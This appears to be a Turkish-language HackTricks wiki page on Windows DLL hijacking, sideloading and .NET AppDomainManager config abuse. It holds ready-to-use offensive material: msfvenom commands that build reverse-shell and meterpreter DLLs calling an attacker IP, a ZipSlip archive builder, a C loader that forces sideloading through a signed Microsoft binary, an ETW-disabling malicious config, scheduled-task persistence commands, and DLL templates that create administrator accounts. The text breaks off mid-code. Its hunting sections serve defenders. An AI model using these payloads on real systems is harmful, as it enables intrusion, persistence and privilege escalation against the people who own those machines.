# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yüklemesini sağlamayı içerir. Bu terim **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Esas olarak code execution, persistence ve daha az yaygın olarak privilege escalation için kullanılır. Buradaki odak escalation olsa da hijacking yöntemi, hedeflerden bağımsız olarak aynı kalır.

### Yaygın Teknikler

DLL hijacking için çeşitli yöntemler kullanılır ve her yöntemin etkinliği, uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: İsteğe bağlı olarak orijinal DLL'in işlevselliğini korumak için DLL Proxying kullanarak gerçek bir DLL'i kötü amaçlı olanla değiştirmek.
2. **DLL Search Order Hijacking**: Uygulamanın search pattern'ından yararlanarak kötü amaçlı DLL'i legitimate DLL'den önce gelen bir search path'e yerleştirmek.
3. **Phantom DLL Hijacking**: Var olmayan, gerekli bir DLL olduğunu düşünerek uygulamanın yüklemesi için kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'e yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi search parameter'larını değiştirmek.
5. **WinSxS DLL Replacement**: Genellikle DLL side-loading ile ilişkilendirilen bir yöntem olarak, WinSxS dizinindeki legitimate DLL'i kötü amaçlı bir karşılığıyla değiştirmek.
6. **Relative Path DLL Hijacking**: Binary Proxy Execution tekniklerine benzeyecek şekilde, kötü amaçlı DLL'i kopyalanan uygulamayla birlikte user-controlled bir directory'ye yerleştirmek.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading, güvenilir bir **.NET Framework** process'inin attacker code yüklemesini sağlamanın tek yolu değildir. Hedef executable bir **managed** application ise CLR, executable'ın adını taşıyan bir **application configuration file**'a da başvurur (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Config, EXE'nin yanına yerleştirilmiş attacker-controlled bir assembly'yi gösteriyorsa CLR bunu **application'ın normal code path'inden önce** yükler ve trusted process içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework configuration schema'sına göre özel manager'ın kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` mevcut olmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal yönetici:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Pratik notlar:
- Bu, **.NET Framework'e özgü** bir tradecraft'tır. Win32 DLL search order'a değil, CLR config parsing'e dayanır.
- Host gerçekten bir **managed EXE** olmalıdır. Hızlı triage: `sigcheck -m target.exe`, `corflags target.exe` veya PE metadata içindeki **CLR Runtime Header** kontrol edilebilir.
- Config filename, executable name ile tam olarak eşleşmelidir (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunur.
- Bu yöntem **signed Microsoft/vendor binaries** ile kullanışlıdır; trusted EXE'ye dokunulmadan malicious managed assembly in-process olarak çalıştırılır.
- Zaten writable bir installer/update directory'ye erişiminiz varsa, AppDomainManager hijacking **first stage** olarak kullanılabilir; ardından sonraki aşamalar için classic DLL sideloading veya reflective loading uygulanabilir.

### AppDomainManager bir downloader + scheduled-task bootstrap olarak

Pratik bir intrusion pattern, trusted managed EXE'yi hem malicious `*.config` hem de yalnızca **small bootstrapper** olarak çalışan malicious bir AppDomainManager DLL ile birlikte kullanmaktır:<sup>[[25]](#references)</sup>

1. User, signed bir .NET installer veya updater'ı `%USERPROFILE%\Downloads` gibi güvenilir görünen bir konumdan başlatır.
2. Yanındaki config, legitimate app logic başlamadan **önce** CLR'ın attacker assembly'yi yüklemesine neden olur.
3. Malicious manager bir **path gate** uygular (örneğin yalnızca host EXE `Downloads` içinden çalışıyorsa devam eder ve yalnızca second stage'in `%LOCALAPPDATA%` içinden çalışmasına izin verir).
4. Check başarılı olursa payload'u `%LOCALAPPDATA%\PerfWatson2.exe` gibi user-writable bir path'e indirir ve scheduled task ile persistence kurar.

Bu variant neden önemlidir:
- Signed host EXE değişmeden kalır; bu nedenle yalnızca main binary'yi hash'leyen triage compromise'ı gözden kaçırabilir.
- Basit **path-based anti-analysis** yaygındır: ZIP/EXE/DLL triad'ını Desktop, Temp veya sandbox path'ine taşımak chain'i kasıtlı olarak bozabilir.
- First-stage AppDomainManager DLL küçük ve düşük gürültülü kalabilir; gerçek implant daha sonra fetch edilir.

Bu pattern ile sık görülen minimal persistence örneği:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notlar:
- ` /rl highest`, ilgili kullanıcı/oturum için **kullanılabilen en yüksek** yetki anlamına gelir; tek başına garantili bir SYSTEM escalation değildir.
- Bu teknik, klasik eksik DLL arama sırası hijacking'inden ziyade **.NET config abuse üzerinden execution/persistence** olarak kategorize edilir; ancak operatörler sıklıkla ikisini birlikte zincirler.

Tespit odakları:
- **ZIP extraction paths**, `Downloads`, `%TEMP%` veya kullanıcı tarafından yazılabilir diğer klasörlerden başlatılan ve yanında `<exe>.config` bulunan imzalı .NET executable'ları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` altındaki bir konumu gösteren ve adları browser/vendor updater'larını taklit eden yeni scheduled task'lar.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` başlatan kısa ömürlü managed bootstrap process'leri.
- Executable path beklenen bir user-profile directory ile eşleşmediği sürece erken sonlanan sample'lar.

### Mevcut bir scheduled task'ı sideload chain'i yeniden başlatacak şekilde hijack etme

Persistence için yalnızca **yeni bir task oluşturulmasını** aramayın. Bazı intrusion set'ler, meşru bir installer'ın **normal bir updater task** oluşturmasını bekler ve ardından mevcut adı, yazarı ve trigger'ı defender'lar için tanıdık kalacak şekilde **task action'ı yeniden yazar**.

Yeniden kullanılabilir workflow:
1. Meşru software'i kurun/çalıştırın ve normalde oluşturduğu task'ı belirleyin.
2. Task XML'ini export edin ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.<sup>[[23]](#references)</sup>
3. Yalnızca action'ı değiştirerek task'ın, user-writable bir staging directory içindeki **trusted host EXE**'nizi başlatmasını sağlayın; bu EXE daha sonra gerçek payload'ı side-load eder veya AppDomain-load eder.
4. Yeni ve bariz bir persistence artifact'i oluşturmak yerine aynı task name'i yeniden register edin.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Neden daha stealthy:
- Task adı hâlâ legitimate görünebilir (örneğin bir vendor updater).
- **Task Scheduler service** bunu başlatır; bu nedenle parent/ancestor validation genellikle `explorer.exe` yerine beklenen scheduling chain'i görür.
- Yalnızca **new task names** arayan DFIR ekipleri, registration'ı zaten mevcut olan ancak action'ı artık `%LOCALAPPDATA%`, `%APPDATA%` veya attacker-controlled başka bir path'i gösteren bir task'ı gözden kaçırabilir.

Hızlı hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML'ini ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata'sını bir baseline ile karşılaştırın.
- **vendor-looking updater task** **user-writable directories** içinden çalıştığında veya yanında bulunan `*.config` dosyasıyla bir .NET EXE başlattığında alert oluşturun.

> [!TIP]
> HTML staging, AES-CTR configs ve .NET implants'i DLL sideloading üzerine katmanlandıran step-by-step chain için aşağıdaki workflow'u inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing Dlls Bulma

Bir system içindeki missing Dlls'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filter'ı ayarlamaktır**:

![Common Techniques - Missing Dlls bulma: Bir system içindeki missing Dlls'leri bulmanın en yaygın yolu, sysinternals'tan procmon çalıştırmak ve aşağıdaki 2 filter'ı ayarlamaktır](<../../../images/image (961).png>)

![Common Techniques - Missing Dlls bulma: Bir system içindeki missing Dlls'leri bulmanın en yaygın yolu, sysinternals'tan procmon çalıştırmak ve aşağıdaki 2 filter'ı ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **File System Activity**'yi gösterin:

![Common Techniques - Missing Dlls bulma: ve yalnızca File System Activity'yi gösterin](<../../../images/image (153).png>)

**Missing dlls in general** arıyorsanız bunu birkaç **seconds** boyunca çalışır durumda **bırakın**.\
**Belirli bir executable içindeki missing dll**'yi arıyorsanız, `"Process Name" "contains" <exec name>` gibi **başka bir filter** ayarlamalı, executable'ı çalıştırmalı ve **event capture'ı durdurmalısınız**.<sup>[[9]](#references)</sup>

## Missing Dlls Exploiting

Privileges escalate etmek için en iyi şansımız, privilege process'in yüklemeye çalışacağı bir **dll'yi**, aranacağı **yerlerden** birine **yazabilmektir**. Böylece, **original dll**'nin bulunduğu folder'dan **önce aranan** bir **folder**'a **dll yazabiliriz** (weird case) veya **dll'nin aranacağı** ve original **dll'nin** hiçbir folder'da bulunmadığı bir folder'a **yazabiliriz**.

### Dll Search Order

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) içinde Dlls'lerin nasıl yüklendiğini ayrıntılı olarak görebilirsiniz.**

**Windows applications**, belirli bir sıraya uyarak önceden tanımlanmış bir dizi **search path** izleyerek DLL'leri arar. DLL hijacking sorunu, zararlı bir DLL'nin bu directory'lerden birine stratejik olarak yerleştirilmesi ve authentic DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemenin bir yolu, application'ın ihtiyaç duyduğu DLL'lere referans verirken absolute path kullanmasını sağlamaktır.

Aşağıda **32-bit** system'lerdeki **DLL search order**'ı görebilirsiniz:

1. Application'ın yüklendiği directory.
2. System directory. Bu directory'nin path'ini almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function'ını kullanın.(_C:\Windows\System32_)
3. 16-bit system directory. Bu directory'nin path'ini alan bir function yoktur, ancak aranır. (_C:\Windows\System_)
4. Windows directory. Bu directory'nin path'ini almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function'ını kullanın.
1. (_C:\Windows_)
5. Current directory.
6. PATH environment variable içinde listelenen directory'ler. Bunun **App Paths** registry key tarafından belirtilen per-application path'i içermediğine dikkat edin. **App Paths** key'i DLL search path hesaplanırken kullanılmaz.

Bu, **SafeDllSearchMode** etkinleştirilmişken kullanılan **default** search order'dır. Devre dışı bırakıldığında current directory ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value'sunu oluşturun ve 0 olarak ayarlayın (default değeri enabled'dır).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function'ı **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa search, **LoadLibraryEx**'in yüklediği executable module'ün directory'sinde başlar.

Son olarak, **bir dll'nin yalnızca adı yerine absolute path belirtilerek yüklenebileceğini** unutmayın. Bu durumda dll **yalnızca belirtilen path'te aranır** (dll'nin dependencies'leri varsa bunlar name ile yüklenmiş gibi aranır).

Search order'ı değiştirmenin başka yolları da vardır, ancak bunları burada açıklamayacağım.

### Arbitrary file write'ı missing-DLL hijack'e chaining etmek

1. Process'in probe ettiği ancak bulamadığı DLL name'lerini toplamak için **ProcMon** filter'larını (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kullanın.<sup>[[14]](#references)</sup>
2. Binary bir **schedule/service** üzerinde çalışıyorsa, bu name'lerden birine sahip DLL'yi **application directory**'sine (search-order entry #1) bırakmak, DLL'nin bir sonraki execution'da yüklenmesini sağlar. Bir .NET scanner case'inde process, gerçek copy'yi `C:\Program Files\dotnet\fxr\...` içinden yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` arıyordu.
3. Herhangi bir export içeren bir payload DLL (ör. reverse shell) oluşturun: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive'iniz **ZipSlip-style arbitrary write** ise, extraction dir'den kaçacak ve DLL'nin app folder'a düşmesini sağlayacak bir ZIP oluşturun:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Arşivi izlenen inbox/share konumuna teslim edin; scheduled task işlemi yeniden başlattığında malicious DLL yüklenir ve kodunuz service account olarak çalıştırılır.

### RTL_USER_PROCESS_PARAMETERS.DllPath ile sideloading zorlaması

Yeni oluşturulan bir işlemin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, işlemi ntdll’nin native API’leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya attacker-controlled bir dizin sağlayarak, import edilen bir DLL’yi adına göre çözen (absolute path kullanmayan ve safe loading flags kullanmayan) bir target process’in malicious DLL’yi bu dizinden yüklemesi zorlanabilir.

Ana fikir
- RtlCreateProcessParametersEx ile process parameters oluşturun ve controlled folder’ınızı gösteren özel bir DllPath sağlayın (örneğin dropper/unpacker’ınızın bulunduğu dizin).
- RtlCreateUserProcess ile işlemi oluşturun. target binary bir DLL’yi adına göre çözdüğünde loader, çözümleme sırasında sağlanan DllPath’e başvurur ve malicious DLL target EXE ile aynı dizinde olmasa bile güvenilir sideloading sağlar.

Notlar/sınırlamalar
- Bu, oluşturulan child process’i etkiler; yalnızca current process’i etkileyen SetDllDirectory’den farklıdır.
- target, bir DLL’yi adına göre import etmeli veya LoadLibrary kullanmalıdır (absolute path kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve hardcoded absolute paths hijack edilemez. Forwarded exports ve SxS öncelik sırasını değiştirebilir.

Minimal C örneği (ntdll, wide strings, basitleştirilmiş error handling):

<details>
<summary>Full C example: RTL_USER_PROCESS_PARAMETERS.DllPath ile DLL sideloading zorlama</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Gerekli işlevleri dışa aktaran veya gerçek DLL'ye proxy'leyen kötü amaçlı bir xmllite.dll dosyasını DllPath dizininize yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını ada göre aradığı bilinen imzalı bir binary başlatın. loader, import'u sağlanan DllPath üzerinden çözer ve DLL'nizi sideloading ile yükler.

Bu tekniğin, gerçek saldırılarda çok aşamalı sideloading zincirlerini yürütmek için kullanıldığı gözlemlenmiştir: ilk launcher bir yardımcı DLL bırakır; bu DLL daha sonra özel bir DllPath ile Microsoft imzalı ve hijack edilebilir bir binary başlatarak attacker'ın DLL'sinin bir staging dizininden yüklenmesini zorlar.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** hedeflerinde sideloading, belleği patch'lemeden, uygulamanın yanında bulunan **`.exe.config`** dosyasının kötüye kullanılmasıyla **`Main()` öncesinde** gerçekleştirilebilir. Attacker, yalnızca Win32 DLL arama sırasına güvenmek yerine, meşru bir .NET EXE dosyasını kötü amaçlı bir config dosyası ve attacker tarafından kontrol edilen bir veya daha fazla assembly ile aynı dizine yerleştirir.

Zincirin çalışma şekli:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE başlatılır ve **CLR, `<exe>.config` dosyasını okur**.
2. Config, runtime'ın attacker tarafından kontrol edilen bir `AppDomainManager` örneği oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlar.
3. Kötü amaçlı manager, trusted host process içinde **`Main()` öncesi çalıştırma** elde eder.
4. Aynı config, CLR'ı yerel assembly'leri önce çözümlemeye zorlayabilir (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) ve inline patching olmadan runtime doğrulamasını/telemetrisini zayıflatabilir.

Campaign tarzı pattern (tam iç içe yerleşim directive / CLR sürümüne göre değişebilir):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Neden kullanışlı:
- **`<probing privatePath="."/>`**, assembly çözümlemesini uygulama dizininde tutarak klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, yürütmeyi CLR başlatması sırasında, meşru uygulama mantığı çalışmadan önce attacker koduna taşır.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**, full-trust bir uygulamanın strong-name doğrulama hatası olmadan imzasız veya değiştirilmiş assembly'leri yüklemesine izin verebilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher-policy yönlendirmeleriyle daha yeni assembly'lere geçişi önler.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha deterministik hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**, özellikle ilgi çekicidir; çünkü **CLR, implantın bellekte `EtwEventWrite` patch'lemesi yerine, kendi ETW görünürlüğünü configuration üzerinden devre dışı bırakır**.

Son kampanyalarda görülen operasyonel model:
- Aşama 1, `setup.exe`, `setup.exe.config` ve yerel assembly'leri bırakır.
- Aşama 2, bunları inandırıcı bir **AppData update** klasörüne kopyalar, host'u `update.exe` gibi bir adla yeniden adlandırır ve **scheduled task** aracılığıyla yeniden başlatır.
- Aşama 3, final RAT DLL/export'unu yüklemeden önce yürütme bağlamını doğrular (örneğin Task Scheduler'dan beklenen parent olan `svchost.exe`).

Hunting fikirleri:
- Kullanıcı tarafından yazılabilir konumlarda şüpheli yanındaki **`.config`** dosyalarıyla çalışan imzalı veya başka şekilde meşru **.NET executable**'ları.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- Yeniden adlandırılmış update binary'lerini **`%LOCALAPPDATA%`** veya uygulamaya özgü `\bin\update\` dizinlerinden yeniden başlatan scheduled task'ler.
- Bir scheduled task'ın güvenilir bir .NET host'u başlattığı ve host'un hemen kendi dizinindeki vendor dışı assembly'leri yüklediği parent/child zincirleri.

#### Windows docs üzerindeki dll search order istisnaları

Windows documentation'da standart DLL search order için bazı istisnalar belirtilmiştir:

- Bellekte zaten yüklenmiş olanla aynı adı paylaşan bir **DLL** ile karşılaşıldığında sistem olağan search işlemini atlar. Bunun yerine, bellekteki DLL'ye dönmeden önce redirection ve manifest kontrolü gerçekleştirir. **Bu senaryoda sistem DLL için search gerçekleştirmez**.
- DLL'nin mevcut Windows sürümü için bir **known DLL** olduğu anlaşılırsa sistem, search sürecini **atlayarak**, dependent DLL'leriyle birlikte known DLL'nin kendi sürümünü kullanır. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**, bu known DLL'lerin listesini içerir.
- Bir **DLL'nin dependencies'leri** varsa bu dependent DLL'ler, ilk DLL full path üzerinden tanımlanmış olsa bile yalnızca **module names** ile belirtilmiş gibi aranır.

### Escalating Privileges

**Gereksinimler**:

- **DLL** eksik olan ve **farklı privileges** altında çalışan veya çalışacak bir process tanımlayın (horizontal veya lateral movement).
- **DLL**'nin aranacağı herhangi bir **directory** için **write access** bulunduğundan emin olun. Bu konum executable'ın directory'si veya system path içindeki bir directory olabilir.

Evet, gereksinimleri bulmak karmaşıktır; çünkü **varsayılan olarak bir DLL'si eksik privileged executable bulmak biraz tuhaftır** ve **bir system path klasöründe write permissions bulunması daha da tuhaftır** (varsayılan olarak buna sahip olamazsınız). Ancak misconfigured ortamlarda bu mümkündür.\
Şanslıysanız ve gereksinimleri karşılayan bir durum bulursanız [UACME](https://github.com/hfiref0x/UACME) projesini inceleyebilirsiniz. Projenin **ana amacı UAC bypass** olsa da burada kullanabileceğiniz Windows sürümü için bir DLL hijaking **PoC** bulabilirsiniz (muhtemelen yalnızca write permissions sahibi olduğunuz klasörün path'ini değiştirmeniz gerekir).

Bir klasördeki **permissions'larınızı** şu işlemi yaparak **check edebileceğinizi** unutmayın:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bir executable'ın import'larını ve bir dll'in export'larını şu araçla da kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**Dll Hijacking ile ayrıcalıkları yükseltmenin** ve **System Path klasöründe** yazma izinlerini kullanmanın kapsamlı rehberi için şuraya bakın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), System PATH içindeki herhangi bir klasörde yazma izinleriniz olup olmadığını kontrol eder.\
Bu açığı keşfetmek için kullanılan diğer ilginç otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_.

### Örnek

Exploit edilebilir bir senaryo bulmanız durumunda, bunu başarıyla exploit edebilmek için en önemli unsurlardan biri, **executable dosyanın kendisinden import edeceği tüm functions'ları export eden en az bir dll oluşturmaktır**. Her durumda, Dll Hijacking'in **Medium Integrity level'dan High seviyesine (UAC'yi bypass ederek)** [ayrıcalık yükseltmek](../../authentication-credentials-uac-and-efs/index.html#uac) veya[ **High Integrity'den SYSTEM'e**](../index.html#from-high-integrity-to-system)** yükselmek için** kullanışlı olduğunu unutmayın. **Geçerli bir dll oluşturma** örneğini, execution için dll hijacking'e odaklanan şu dll hijacking çalışmasının içinde bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölüm**de, **template** olarak kullanılabilecek veya **gerekli olmayan functions'ları export eden bir dll** oluşturmak için kullanılabilecek bazı **temel dll kodlarını** bulabilirsiniz.

## **Dll'leri oluşturma ve derleme**

### **Dll Proxifying**

Temel olarak bir **Dll proxy**, **yüklendiğinde malicious kodunuzu çalıştırabilen**, ancak aynı zamanda **tüm çağrıları gerçek library'ye aktararak** **beklendiği gibi expose** edip **çalışabilen** bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla bir **executable belirtebilir ve proxify etmek istediğiniz library'yi seçebilir**, ardından **proxified dll oluşturabilir** veya **Dll'yi belirterek** bir **proxified dll oluşturabilirsiniz**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) edinin:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kullanıcı oluştur (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendinizinki

Bazı durumlarda derlediğiniz DLL'nin, victim process tarafından yüklenecek **birden fazla function export etmesi** gerektiğini unutmayın; bu function'lar mevcut değilse **binary bunları yükleyemez** ve **exploit başarısız olur**.

<details>
<summary>C DLL şablonu (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>kullanıcı oluşturma içeren C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Thread entry kullanan alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
